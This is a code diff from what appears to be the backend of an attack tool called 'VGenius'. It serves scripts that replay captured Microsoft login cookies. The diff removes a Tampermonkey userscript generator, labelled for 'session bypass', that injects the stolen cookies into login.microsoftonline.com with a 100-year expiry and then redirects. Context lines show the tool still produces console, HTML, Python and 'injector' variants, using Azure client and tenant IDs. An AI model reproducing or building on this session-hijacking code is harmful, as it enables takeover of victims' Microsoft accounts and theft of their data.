@@ -152,7 +152,6 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
     var scripts = {};
     scripts.console = generatePopupScript(cookiesList);
     scripts.html = generateStandaloneHtml(cookiesList);
-    scripts.tampermonkey = generateTampermonkeyScript(cookiesList);
     scripts.python = generatePythonScript(cookiesList);
     scripts.injector = generateInjectorScript(cookiesList, token.client_id || config.AZURE_CLIENT_ID, token.tenant || config.AZURE_TENANT || 'common');
 
@@ -320,50 +319,6 @@ function generateStandaloneHtml(cookies) {
   html += '</body></html>';
 
   return html;
-}
-
-// ─── Tampermonkey userscript ────────────────────────────────────────
-function generateTampermonkeyScript(cookies) {
-  const cookieJson = JSON.stringify(cookies);
-  // FIX: Reasonable expiry (7 days) instead of 100 years for tampermonkey script
-  const expires = new Date();
-  expires.setDate(expires.getDate() + 7);
-  const expStr = expires.toUTCString();
-
-  var script = '// ==UserScript==\n';
-  script += '// @name VGenius Cookie Injector\n';
-  script += '// @namespace http://tampermonkey.net/\n';
-  script += '// @version 2.0\n';
-  script += '// @description Inject Microsoft cookies for session bypass\n';
-  script += '// @author VGenius\n';
-  script += '// @match https://login.microsoftonline.com/*\n';
-  script += '// @grant none\n';
-  script += '// ==/UserScript==\n\n';
-  script += '(function() {\n';
-  script += ' \'use strict\';\n\n';
-  script += ' var cookies = ' + cookieJson + ';\n';
-  script += ' var exp = new Date();\n';
-  script += ' exp.setFullYear(exp.getFullYear() + 100);\n';
-  script += ' var expStr = exp.toUTCString();\n\n';
-  script += ' for (var i = 0; i < cookies.length; i++) {\n';
-  script += ' try {\n';
-  script += ' var c = cookies[i];\n';
-  script += ' var d = c.domain || ".login.microsoftonline.com";\n';
-  script += ' document.cookie = c.name + "=" + encodeURIComponent(c.value)\n';
-  script += ' + "; domain=" + d\n';
-  script += ' + "; expires=" + expStr\n';
-  script += ' + "; path=/; SameSite=None; Secure";\n';
-  script += ' } catch(e) {}\n';
-  script += ' }\n\n';
-  script += ' console.log("VGenius: Injected " + cookies.length + " cookies");\n';
-  script += ' alert("Injected ' + cookies.length + ' cookies. Click OK to continue.");\n';
-  script += '\n';
-  script += ' setTimeout(function() {\n';
-  script += ' window.location.href = "https://login.microsoftonline.com/?auth=2";\n';
-  script += ' }, 3000);\n';
-  script += '})();\n';
-
-  return script;
 }
 
 // ─── Python requests script ─────────────────────────────────────────
